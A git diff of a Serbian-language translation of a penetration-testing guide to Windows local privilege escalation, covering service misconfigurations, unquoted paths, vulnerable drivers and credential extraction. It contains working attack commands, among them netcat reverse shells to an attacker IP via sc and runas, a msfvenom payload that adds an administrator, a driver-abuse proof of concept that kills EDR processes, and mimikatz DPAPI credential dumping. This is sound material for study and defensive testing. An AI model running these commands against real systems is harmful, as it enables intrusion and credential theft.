+Service Triggers omogućavaju Windows-u da pokrene servis kada se dese određeni uslovi (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, itd.). Čak i bez SERVICE_START prava često možete pokrenuti privilegovane servise aktiviranjem njihovih triggera. Vidi tehnike enumeracije i aktivacije ovde:
 
 -
 {{#ref}}
@@ -453,15 +462,15 @@ Get-Service
 ```
 ### Dozvole
 
-Možete koristiti **sc** da biste dobili informacije o servisu
+Možete koristiti **sc** da dobijete informacije o servisu
 ```bash
 sc qc <service_name>
 ```
-Preporučuje se imati binarni fajl **accesschk** iz _Sysinternals_ za proveru potrebnog nivoa privilegija za svaku uslugu.
+Preporučuje se da imate binarni **accesschk** iz _Sysinternals_ da biste proverili potrebni nivo privilegija za svaki servis.
 ```bash
 accesschk.exe -ucqv <Service_Name> #Check rights for different groups
 ```
-Preporučuje se proveriti da li "Authenticated Users" mogu izmeniti bilo koju uslugu:
+Preporučuje se proveriti da li "Authenticated Users" mogu da izmene bilo koji servis:
 ```bash
 accesschk.exe -uwcqv "Authenticated Users" * /accepteula
 accesschk.exe -uwcqv %USERNAME% * /accepteula
@@ -472,7 +481,7 @@ accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
 
 ### Omogućavanje servisa
 
-Ako dobijate ovu grešku (na primer sa SSDPSRV):
+Ako imate ovu grešku (na primer sa SSDPSRV):
 
 _System error 1058 has occurred._\
 _The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._
@@ -488,9 +497,9 @@ sc config SSDPSRV obj= ".\LocalSystem" password= ""
 ```
 sc.exe config usosvc start= auto
 ```
-### **Izmenite putanju binarne datoteke servisa**
+### **Izmena puta do binarne datoteke servisa**
 
-U scenariju gde grupa "Authenticated users" ima **SERVICE_ALL_ACCESS** nad servisom, moguće je izmeniti izvršnu binarnu datoteku servisa. Da biste izmenili i izvršili **sc**:
+U scenariju gde grupa "Authenticated users" poseduje **SERVICE_ALL_ACCESS** nad servisom, moguća je izmena izvršne binarne datoteke servisa. Da biste izmenili i pokrenuli **sc**:
 ```bash
 sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
 sc config <Service_Name> binpath= "net localgroup administrators username /add"
@@ -505,18 +514,18 @@ net stop [service name] && net start [service name]
 ```
 Privilegije se mogu eskalirati kroz različita dopuštenja:
 
-- **SERVICE_CHANGE_CONFIG**: Omogućava rekonfiguraciju izvršnog fajla servisa.
-- **WRITE_DAC**: Omogućava promenu dozvola, što dovodi do mogućnosti menjanja konfiguracije servisa.
+- **SERVICE_CHANGE_CONFIG**: Omogućava rekonfiguraciju binarnog fajla servisa.
+- **WRITE_DAC**: Omogućava promenu dozvola, što vodi do mogućnosti menjanja konfiguracija servisa.
 - **WRITE_OWNER**: Dozvoljava preuzimanje vlasništva i promenu dozvola.
-- **GENERIC_WRITE**: Omogućava izmene konfiguracija servisa.
-- **GENERIC_ALL**: Takođe omogućava izmene konfiguracija servisa.
+- **GENERIC_WRITE**: Nasleđuje mogućnost menjanja konfiguracija servisa.
+- **GENERIC_ALL**: Takođe nasleđuje mogućnost menjanja konfiguracija servisa.
 
-Za otkrivanje i eksploataciju ove ranjivosti može se iskoristiti _exploit/windows/local/service_permissions_.
+Za detekciju i eksploataciju ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.
 
-### Slabe dozvole izvršnih fajlova servisa
+### Slabe dozvole binarnih fajlova servisa
 
-**Proverite da li možete izmeniti izvršni fajl koji pokreće servis** or if you have **write permissions on the folder** where the binary is located ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
-Možete dobiti sve izvršne fajlove koje pokreće servis koristeći **wmic** (not in system32) i proveriti svoje dozvole koristeći **icacls**:
+**Check if you can modify the binary that is executed by a service** or if you have **write permissions on the folder** where the binary is located ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
+You can get every binary that is executed by a service using **wmic** (not in system32) and check your permissions using **icacls**:
 ```bash
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
 
@@ -528,10 +537,10 @@ sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
 FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
 FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
 ```
-### Dozvole za izmenu registra servisa
+### Dozvole za izmenu service registry
 
-Treba da proverite da li možete da izmenite bilo koji unos u registru servisa.\
-Možete **proveriti** svoje **dozvole** nad registrom **servisa** tako što ćete:
+Treba da proverite da li možete izmeniti bilo koji service registry.\
+Možete **check** svoje **permissions** nad service **registry** tako što ćete:
 ```bash
 reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
 
@@ -540,15 +549,16 @@ for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\
 
 get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
 ```
-Trebalo bi proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** poseduju `FullControl` dozvole. Ako je tako, binarni fajl koji servis izvršava može biti izmenjen.
+Trebalo bi proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju `FullControl` dozvole. Ako je tako, binarni fajl koji servis izvršava može se izmeniti.
 
-Da biste promenili Path izvršnog binarnog fajla:
+Da biste promenili Path izvršavanog binarnog fajla:
 ```bash
 reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
 ```
-### Services registry AppendData/AddSubdirectory permissions
+### Dozvole registra servisa AppendData/AddSubdirectory
 
-Ako imate ovo dopuštenje nad registry-jem, to znači da **možete kreirati pod-registre iz ovog**. U slučaju Windows services ovo je **dovoljno za izvršavanje proizvoljnog koda:**
+Ako imate ovu dozvolu nad registrom, to znači da **možete kreirati pod-registre iz ovog registra**. U slučaju Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**
+
 
 {{#ref}}
 appenddata-addsubdirectory-permission-over-service-registry.md
@@ -556,7 +566,7 @@ appenddata-addsubdirectory-permission-over-service-registry.md
 
 ### Unquoted Service Paths
 
-Ako putanja do izvršne datoteke nije unutar navodnika, Windows će pokušati da izvrši svaki deo koji se završava pre razmaka.
+Ako putanja do izvršne datoteke nije u navodnicima, Windows će pokušati da izvrši svaki deo puta koji prethodi razmaku.
 
 Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:
 ```bash
@@ -564,7 +574,7 @@ C:\Program.exe
 C:\Program Files\Some.exe
 C:\Program Files\Some Folder\Service.exe
 ```
-Navedite sve putanje servisa koje nisu u navodnicima, osim onih koje pripadaju ugrađenim Windows servisima:
+Navedite sve putanje servisa bez navodnika, osim onih koje pripadaju ugrađenim Windows servisima:
 ```bash
 wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
 wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services
@@ -584,19 +594,19 @@ echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s &&
 ```bash
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
-**Možete otkriti i iskoristiti** ovu ranjivost koristeći metasploit: `exploit/windows/local/trusted\_service\_path` Možete ručno kreirati servisni binarni fajl koristeći metasploit:
+**Možete otkriti i iskoristiti** ovu ranjivost pomoću metasploit: `exploit/windows/local/trusted_service_path` Možete ručno kreirati binarnu datoteku servisa pomoću metasploit:
 ```bash
 msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
 ```
-### Akcije oporavka
+### Radnje oporavka
 
-Windows omogućava korisnicima da navedu akcije koje će se preduzeti ako servis zakaže. Ova funkcija se može konfigurisati da pokazuje na binary. Ako se taj binary može zameniti, može biti moguć privilege escalation. Više detalja možete pronaći u [službenoj dokumentaciji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).
+Windows omogućava korisnicima da odrede akcije koje treba preduzeti ako servis zakaže. Ova funkcija se može konfigurisati da upućuje na binary. Ako se taj binary može zameniti, moguće je privilege escalation. Više detalja možete naći u [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).
 
 ## Aplikacije
 
 ### Instalirane aplikacije
 
-Proverite **permissions of the binaries** (možda možete zameniti neki i escalate privileges) i **foldere** ([DLL Hijacking](dll-hijacking/index.html)).
+Proverite **dozvole za binaries** (možda možete prepisati neki i escalate privileges) i **foldere** ([DLL Hijacking](dll-hijacking/index.html)).
 ```bash
 dir /a "C:\Program Files"
 dir /a "C:\Program Files (x86)"
@@ -607,9 +617,9 @@ Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 ```
 ### Dozvole za pisanje
 
-Proverite da li možete izmeniti neki konfiguracioni fajl da biste pročitali neki poseban fajl ili da li možete izmeniti neki binarni fajl koji će biti izvršen od strane Administrator naloga (schedtasks).
+Proverite da li možete izmeniti neku config datoteku da pročitate neku specijalnu datoteku ili da li možete izmeniti neki binary koji će biti izvršen sa Administrator naloga (schedtasks).
 
-Jedan način da pronađete slabe dozvole za foldere/fajlove u sistemu je da uradite:
+Jedan način da pronađete slabe dozvole za foldere/datoteke u sistemu je sledeći:
 ```bash
 accesschk.exe /accepteula
 # Find all weak folder permissions per drive.
@@ -634,7 +644,7 @@ Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Ac
 ```
 ### Pokretanje pri pokretanju sistema
 
-**Proverite da li možete prepisati neki registry ili binary koji će biti izvršen od strane drugog korisnika.**\
+**Proverite da li možete overwrite neki registry ili binary koji će biti izvršen od strane drugog korisnika.**\
 **Pročitajte** **sledeću stranicu** da saznate više o zanimljivim **autoruns locations to escalate privileges**:
 
 
@@ -644,13 +654,13 @@ privilege-escalation-with-autorun-binaries.md
 
 ### Drajveri
 
-Potražite moguće **third party weird/vulnerable** drajvere
+Potražite moguće **drajvere trećih strana koji su neobični/ranjivi**
 ```bash
 driverquery
 driverquery.exe /fo table
 driverquery /SI
 ```
-Ako driver izlaže arbitrary kernel read/write primitive (uobičajeno u loše dizajniranim IOCTL handler-ima), možete eskalirati tako što ćete ukrasti SYSTEM token direktno iz kernel memorije. See the step‑by‑step technique here:
+If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:
 
 {{#ref}}
 arbitrary-kernel-rw-token-theft.md
@@ -664,7 +674,7 @@ kernel-race-condition-object-manager-slowdown.md
 
 #### Registry hive memory corruption primitives
 
-Moderne hive vulnerabilities vam omogućavaju da groom deterministic layouts, abuse writable HKLM/HKU descendants, i convert metadata corruption u kernel paged-pool overflows bez custom driver-a. Learn the full chain here:
+Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:
 
 {{#ref}}
 windows-registry-hive-exploitation.md
@@ -672,17 +682,17 @@ windows-registry-hive-exploitation.md
 
 #### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)
 
-Neki potpisani third‑party driveri kreiraju svoj device object sa jakim SDDL putem IoCreateDeviceSecure, ali zaborave da postave FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez tog flag-a, secure DACL se ne primenjuje kada se device otvori putem path-a koji sadrži dodatnu komponentu, dopuštajući bilo kojem neprivilegovanom korisniku da dobije handle koristeći namespace path kao:
+Neki potpisani third‑party driveri kreiraju svoj device object sa jakim SDDL putem IoCreateDeviceSecure ali zaborave da postave FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ovog flag-a, secure DACL se ne primenjuje kada se device otvori kroz path koji sadrži dodatnu komponentu, omogućavajući bilo kom neprivilegovanom korisniku da dobije handle koristeći namespace path kao:
 
 - \\ .\\DeviceName\\anything
-- \\ .\\amsdk\\anyfile (from a real-world case)
+- \\ .\\amsdk\\anyfile (iz stvarnog slučaja)
 
-Kada korisnik može da otvori device, privileged IOCTLs koje driver izlaže mogu se zloupotrebiti za LPE i tampering. Primeri mogućnosti viđeni u praksi:
-- Vratiti full-access handles ka proizvoljnim procesima (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
-- Nerestriktovan raw disk read/write (offline tampering, boot-time persistence tricks).
-- Prekinuti proizvoljne procese, uključujući Protected Process/Light (PP/PPL), omogućavajući AV/EDR kill iz user land-a preko kernela.
+Kada korisnik može otvoriti device, privileged IOCTLs izloženi od strane drivera mogu se zloupotrebiti za LPE i manipulaciju. Primeri mogućnosti viđenih u praksi:
+- Vratiti full-access handle-e ka arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
+- Neograničen raw disk read/write (offline tampering, boot-time persistence tricks).
+- Terminirati arbitrary processes, uključujući Protected Process/Light (PP/PPL), omogućavajući AV/EDR kill iz user land-a via kernel.
 
-Minimal PoC pattern (user mode):
+Minimalni PoC pattern (user mode):
 ```c
 // Example based on a vulnerable antimalware driver
 #define IOCTL_REGISTER_PROCESS  0x80002010
@@ -694,14 +704,15 @@ DWORD target = /* PID to kill or open */;
 DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
 DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
 ```
-Mitigacije za programere
-- Uvek postavite FILE_DEVICE_SECURE_OPEN pri kreiranju device objekata koji treba da budu ograničeni DACL-om.
-- Validirajte kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre nego što dozvolite terminaciju procesa ili vraćanje handle-a.
-- Ograničite IOCTLs (access masks, METHOD_*, input validation) i razmotrite brokered modele umesto direktnih kernel privilegija.
+Mitigations for developers
+- Uvek postavite FILE_DEVICE_SECURE_OPEN kada kreirate device objects koji treba da budu ograničeni DACL-om.
+- Validirajte kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre nego što dozvolite terminiranje procesa ili vraćanje handle-a.
+- Ograničite IOCTLs (maske pristupa, METHOD_*, validacija ulaza) i razmotrite modele sa brokerom umesto direktnih kernel privilegija.
 
-Ideje za detekciju za odbrambene timove
-- Monitorujte user-mode otvaranja sumnjivih imena uređaja (e.g., \\ .\\amsdk*) i specifične IOCTL sekvence koje ukazuju na zloupotrebu.
-- Primenujte Microsoft-ovu listu blokiranih ranjivih drajvera (HVCI/WDAC/Smart App Control) i održavajte sopstvene liste dozvoljenih/odbijenih.
+Detection ideas for defenders
+- Pratite user-mode otvaranja sumnjivih device imena (e.g., \\ .\\amsdk*) i specifičnih IOCTL sekvenci koje ukazuju na zloupotrebu.
+- Sprovodite Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) i održavajte sopstvene allow/deny liste.
+
 
 ## PATH DLL Hijacking
 
@@ -730,7 +741,7 @@ net share #Check current shares
 ```
 ### hosts file
 
-Proverite da li su drugi poznati računari hardkodirani u hosts file
+Proverite da li su drugi poznati računari hardcoded u hosts file
 ```
 type C:\Windows\System32\drivers\etc\hosts
 ```
@@ -742,7 +753,7 @@ Get-DnsClientServerAddress -AddressFamily IPv4 | ft
 ```
 ### Otvoreni portovi
 
-Proverite da li su **ograničeni servisi** izloženi spolja.
+Proverite da li postoje **servisi sa ograničenim pristupom** iz spoljašnje mreže
 ```bash
 netstat -ano #Opened ports?
 ```
@@ -758,9 +769,9 @@ Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
 ```
 ### Firewall Rules
 
-[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(prikaz pravila, kreiranje pravila, isključivanje, isključivanje...)**
+[**Pogledajte ovu stranicu za komande vezane za Firewall**](../basic-cmd-for-pentesters.md#firewall) **(prikaz pravila, kreiranje pravila, isključivanje, isključivanje...)**
 
-Više[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)
+Više[ komandi za network enumeration ovde](../basic-cmd-for-pentesters.md#network)
 
 ### Windows Subsystem for Linux (wsl)
 ```bash
@@ -769,16 +780,16 @@ C:\Windows\System32\wsl.exe
 ```
 Binarni fajl `bash.exe` se takođe može naći u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`
 
-Ako dobijete root user, možete slušati na bilo kojem portu (prvi put kada koristite `nc.exe` za slušanje na portu, GUI će vas pitati da li `nc` treba da bude dozvoljen u firewall-u).
+Ako dobijete root user, možete da slušate na bilo kojem portu (prvi put kada koristite `nc.exe` za slušanje na portu, pitaće putem GUI da li `nc` treba da bude dozvoljen od strane firewall-a).
 ```bash
 wsl whoami
 ./ubuntun1604.exe config --default-user root
 wsl whoami
 wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
 ```
-Da biste lako pokrenuli bash kao root, možete probati `--default-user root`
+Da biste lako pokrenuli bash kao root, možete pokušati sa `--default-user root`
 
-Možete istražiti `WSL` fajl sistem u folderu `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`
+Možete istražiti `WSL` sistem fajlova u folderu `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`
 
 ## Windows kredencijali
 
@@ -794,18 +805,16 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDef
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
 ```
-### Menadžer kredencijala / Windows Vault
+### Credentials manager / Windows vault
 
-Iz [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
-Windows Vault čuva korisničke kredencijale za servere, web-sajtove i druge programe za koje **Windows** može **automatski prijaviti korisnike**.
+From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
+Windows Vault čuva korisničke credentials za servere, web sajtove i druge programe koje **Windows** može **log in the users automaticall**y. Na prvi pogled, može izgledati kao da korisnici mogu da sačuvaju svoje Facebook credentials, Twitter credentials, Gmail credentials itd., kako bi se automatski prijavljivali kroz browsere. Ali to nije slučaj.
 
-Na prvi pogled, može delovati kao da korisnici mogu da čuvaju svoje Facebook kredencijale, Twitter kredencijale, Gmail kredencijale itd., kako bi se automatski prijavljivali preko pretraživača. Ali to nije tako.
+Windows Vault čuva credentials koje Windows može automatski koristiti za prijavu korisnika, što znači da bilo koja **Windows application that needs credentials to access a resource** (server ili web sajt) **can make use of this Credential Manager** & Windows Vault i koristi dostavljene credentials umesto da korisnici stalno unose username i password.
 
-Windows Vault čuva kredencijale koje Windows može automatski iskoristiti za prijavu korisnika, što znači da svaka **Windows aplikacija kojoj su potrebni kredencijali za pristup resursu** (serveru ili veb-sajtu) **može koristiti ovaj Credential Manager** i Windows Vault i koristiti date kredencijale umesto da korisnici stalno unose korisničko ime i lozinku.
+Ako aplikacije ne komuniciraju sa Credential Manager, mislim da nije moguće da koriste credentials za dati resurs. Dakle, ako vaša aplikacija želi da koristi vault, ona bi nekako trebala **communicate with the credential manager and request the credentials for that resource** iz podrazumevanog storage vault-a.
 
-Ako aplikacije ne komuniciraju sa Credential Manager-om, mislim da nije moguće da koriste kredencijale za dati resurs. Dakle, ako vaša aplikacija želi da koristi vault, treba nekako **komunicirati sa credential manager-om i zatražiti kredencijale za taj resurs** iz podrazumevanog storage vault-a.
-
-Koristite `cmdkey` da nabrojite sačuvane kredencijale na mašini.
+Koristite `cmdkey` da prikažete sačuvane credentials na mašini.
 ```bash
 cmdkey /list
 Currently stored credentials:
@@ -813,37 +822,38 @@ Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
 ```
-Zatim možete koristiti `runas` sa opcijom `/savecred` kako biste iskoristili sačuvane kredencijale. Sledeći primer poziva udaljeni izvršni fajl putem SMB deljenja.
+Zatim možete koristiti `runas` sa opcijom `/savecred` kako biste koristili sačuvane kredencijale. Sledeći primer poziva udaljeni izvršni fajl preko SMB share-a.
 ```bash
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 ```
-Korišćenje `runas` sa datim skupom kredencijala.
+Korišćenje `runas` sa dostavljenim skupom credential.
 ```bash
 C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
 ```
-Imajte na umu da mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ili iz [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).
+Napomena da mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ili iz [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).
 
 ### DPAPI
 
-The **Data Protection API (DPAPI)** pruža metod za simetričnu enkripciju podataka, uglavnom korišćen u Windows operativnom sistemu za simetričnu enkripciju asimetričnih privatnih ključeva. Ova enkripcija koristi korisničku ili sistemsku tajnu koja značajno doprinosi entropiji.
+The **Data Protection API (DPAPI)** obezbeđuje metod za simetričnu enkripciju podataka, pretežno korišćen u Windows operativnom sistemu za simetričnu enkripciju asimetričnih privatnih ključeva. Ova enkripcija koristi korisničku ili sistemsku tajnu koja značajno doprinosi entropiji.
 
-**DPAPI omogućava enkripciju ključeva putem simetričnog ključa koji je izveden iz korisničkih tajni za prijavu**. U scenarijima koji uključuju sistemsku enkripciju, koristi sistemske tajne za autentifikaciju domena.
+**DPAPI omogućava enkripciju ključeva putem simetričnog ključa izvedenog iz korisničkih tajni za prijavu**. U scenarijima koji uključuju sistemsku enkripciju, koristi tajne autentifikacije domena sistema.
 
-Šifrovani korisnički RSA ključevi, korišćenjem DPAPI-ja, nalaze se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, koji je ko-lociran sa master ključem koji štiti korisnikovih privatne ključeve u istoj datoteci**, obično se sastoji od 64 bajta slučajnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, što onemogućava listanje njegovog sadržaja putem `dir` komande u CMD, iako se može listati preko PowerShell-a).
+Šifrovani korisnički RSA ključevi koji koriste DPAPI čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, smešten zajedno sa master ključem koji čuva privatne ključeve korisnika u istom fajlu**, obično se sastoji od 64 bytes nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, što onemogućava listanje njegovog sadržaja komandom `dir` u CMD, iako se može listati preko PowerShell).
 ```bash
 Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
 ```
 Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da ga dešifrujete.
 
-Obično se **credentials fajlovi zaštićeni master password** nalaze u:
+**Datoteke sa kredencijalima zaštićene master lozinkom** obično se nalaze u:
 ```bash
 dir C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
-Možete koristiti **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` da dešifrujete.\
+Možete koristiti **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` da dekriptujete.\
+
 Možete **izvući mnoge DPAPI** **masterkeys** iz **memorije** koristeći `sekurlsa::dpapi` module (ako ste root).
 
 
@@ -851,11 +861,11 @@ Možete **izvući mnoge DPAPI** **masterkeys** iz **memorije** koristeći `sekur
 dpapi-extracting-passwords.md
 {{#endref}}
 
-### PowerShell kredencijali
+### PowerShell Credentials
 
-**PowerShell credentials** se često koriste za **scripting** i zadatke automatizacije kao način za praktično čuvanje šifrovanih kredencijala. Kredencijali su zaštićeni koristeći **DPAPI**, što obično znači da mogu biti dešifrovani samo od strane istog korisnika na istom računaru na kojem su kreirani.
+**PowerShell credentials** se često koriste za **skriptovanje** i zadatke automatizacije kao način praktičnog čuvanja enkriptovanih kredencijala. Kredencijali su zaštićeni pomoću **DPAPI**, što obično znači da ih može dekriptovati samo isti korisnik na istom računaru na kojem su kreirani.
 
-Da biste **dešifrovali** PS credentials iz fajla koji ga sadrži, možete uraditi:
+Da biste **dekriptovali** PS credentials iz fajla koji ih sadrži, možete:
 ```bash
 PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
 PS C:\> $credential.GetNetworkCredential().username
@@ -877,7 +887,7 @@ cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| 
 ```
 ### Sačuvane RDP konekcije
 
-Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
+Možete ih pronaći na `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
 i u `HKCU\Software\Microsoft\Terminal Server Client\Servers\`
 
 ### Nedavno pokrenute komande
@@ -885,22 +895,22 @@ i u `HKCU\Software\Microsoft\Terminal Server Client\Servers\`
 HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 ```
-### **Menadžer kredencijala za Remote Desktop**
+### **Upravljač akreditiva za Remote Desktop**
 ```
 %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
 ```
-Koristite **Mimikatz** `dpapi::rdg` modul sa odgovarajućim `/masterkey` da **dekriptujete bilo koje .rdg fajlove**\
-Možete izvući mnoge DPAPI masterkeys iz memorije sa Mimikatz `sekurlsa::dpapi` modulom
+Koristite **Mimikatz** `dpapi::rdg` modul sa odgovarajućim `/masterkey` da **dešifrujete bilo koje .rdg fajlove**\
+Možete **izvući mnoge DPAPI masterkeys** iz memorije pomoću Mimikatz `sekurlsa::dpapi` modula
 
 ### Sticky Notes
 
-Ljudi često koriste StickyNotes app na Windows radnim stanicama da **sačuvaju lozinke** i druge informacije, ne shvatajući da je to fajl baze podataka. Ovaj fajl se nalazi na `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek vredi tražiti i pregledati.
+Ljudi često koriste StickyNotes aplikaciju na Windows radnim stanicama da **sačuvaju lozinke** i druge informacije, ne shvatajući da je u pitanju fajl baze podataka. Ovaj fajl se nalazi na `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek vredi potražiti i pregledati.
 
 ### AppCmd.exe
 
-**Napomena: da biste povratili lozinke iz AppCmd.exe morate biti Administrator i pokrenuti ga sa High Integrity level.**\
-**AppCmd.exe** se nalazi u direktorijumu `%systemroot%\system32\inetsrv\`.\ 
-Ako ovaj fajl postoji, moguće je da su neke **credentials** konfigurisane i da mogu biti **recovered**.
+**Obratite pažnju da za povraćaj lozinki iz AppCmd.exe morate biti Administrator i pokrenuti proces sa High Integrity nivoom.**\
+**AppCmd.exe** se nalazi u `%systemroot%\system32\inetsrv\` direktorijumu.\
+Ako taj fajl postoji, moguće je da su neke **credentials** konfigurisane i mogu biti **oporavljene**.
 
 Ovaj kod je izvučen iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
 ```bash
@@ -982,38 +992,38 @@ $ErrorActionPreference = $OrigError
 ```
 ### SCClient / SCCM
 
-Proverite da li `C:\Windows\CCM\SCClient.exe` postoji .\
-Instaleri se **pokreću sa SYSTEM privilegijama**, mnogi su ranjivi na **DLL Sideloading (Informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
+Proveri da li `C:\Windows\CCM\SCClient.exe` postoji .\
+Instalateri se **pokreću sa SYSTEM privileges**, mnogi su ranjivi na **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
 ```bash
 $result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
 if ($result) { $result }
 else { Write "Not Installed." }
 ```
